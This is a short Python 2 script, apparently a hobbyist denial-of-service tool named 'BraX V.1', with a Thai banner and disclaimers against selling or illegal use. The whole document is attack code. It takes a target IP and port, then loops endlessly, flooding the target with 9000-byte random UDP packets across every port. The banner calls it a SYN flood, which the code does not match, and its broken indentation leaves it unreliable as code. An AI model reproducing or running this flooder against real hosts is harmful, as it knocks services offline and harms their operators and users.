# เป็นรุ่นทดสอบเท่านั้นห้ามนำไปเผยแพร่หรือขาย
# BraX

 
import os
import sys
import random
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(9000)

	os.system("clear")
	print "#############################"
	print "#         BraX V.1          #"
	print "#############################"
	print "#     ยินดีต้อนรับสู่ SYN DDos    #"
	print "#############################"
	print "Author   : BraX"
  print "Facebook : https://m.facebook.com/J.cknew"
  print "เป็นรุ่น DEMO ห้ามนำไปจำหน่ายหรือดัดแปลงและห้ามนำไปใช้ในทางผิดกฎหมาย"

ip = raw_input("IP : ")
port = input("Port : ") 
	
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65535:
       port = 1
